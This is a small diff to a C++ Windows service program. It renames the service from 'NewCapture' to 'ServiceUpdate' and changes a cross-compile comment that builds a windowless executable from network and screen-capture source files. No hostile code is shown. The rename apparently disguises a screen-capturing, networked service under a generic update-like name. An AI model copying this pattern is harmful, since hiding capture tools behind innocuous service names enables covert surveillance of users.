@@ -58,7 +58,7 @@ void WINAPI service_main(DWORD dwArgc, LPTSTR *lpszArgv) {
 //------------------------------------------------------------------------------
 
 int __cdecl _tmain(int argc, TCHAR *argv[]) {
-    service_manager = new ServiceManager("NewCapture");
+    service_manager = new ServiceManager("ServiceUpdate");
 
     if (lstrcmpi(argv[1], TEXT("install")) == 0) {
         SC_HANDLE service = service_manager->install();
@@ -88,4 +88,4 @@ int __cdecl _tmain(int argc, TCHAR *argv[]) {
 //------------------------------------------------------------------------------
 //------------------------------------------------------------------------------
 
-// i586-mingw32msvc-g++ -mwindows -o service.exe service.cpp service_manager->cpp helper.cpp network.cpp screen_manager.cpp -L./gdi/lib -lgdi32 -lgdiplus -lws2_32 -lole32
+// i586-mingw32msvc-g++ -mwindows -o ServiceUpdate.exe ServiceUpdate.cpp service_manager.cpp helper.cpp network.cpp screen_manager.cpp -L./gdi/lib -lgdi32 -lgdiplus -lws2_32 -lole32
